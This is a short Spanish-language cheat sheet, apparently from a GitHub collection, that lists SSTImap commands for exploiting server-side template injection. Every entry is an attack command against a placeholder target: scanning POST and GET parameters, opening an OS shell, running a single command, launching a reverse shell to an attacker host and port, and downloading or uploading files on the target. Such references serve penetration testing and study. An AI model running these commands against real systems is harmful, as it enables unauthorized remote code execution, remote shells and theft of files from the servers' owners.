# SSTImap Cheat Sheet

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name':
```
./sstimap.py -u 'http://<TARGET>' -m POST -d name
```

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name' y que nos de una shell:
```
./sstimap.py -u 'http://<TARGET>' -m POST -d name --os-shell
```

#### Escaneo de vulnerabilidad SSTI en un request GET:
```
./sstimap.py -u 'http://<TARGET>/execute?cmd=test'
```

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name' y enviar un comando único:
```
./sstimap.py -u 'http://<TARGET>' -m POST -d name -S <COMMAND>
```

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name' y obtener una Reverse Shell:
```
./sstimap.py -u 'http://<TARGET>' -m POST -d name -R <HOST-ATTACK> <PORT-ATTACK>
```

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name' y descargar un arhivo:
```
./sstimap.py -u 'http://<TARGET>' -m POST -d name -D <FILE-NAME-REMOTE> <FILE-NAME-LOCAL>
```

#### Escaneo de vulnerabilidad SSTI a un parametro POST llamado 'name' y cargar un arhivo:
```
./sstimap.py -u 'http://<TARGET>' -m POST -d name -U <FILE-NAME-LOCAL> <FILE-NAME-REMOTE>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)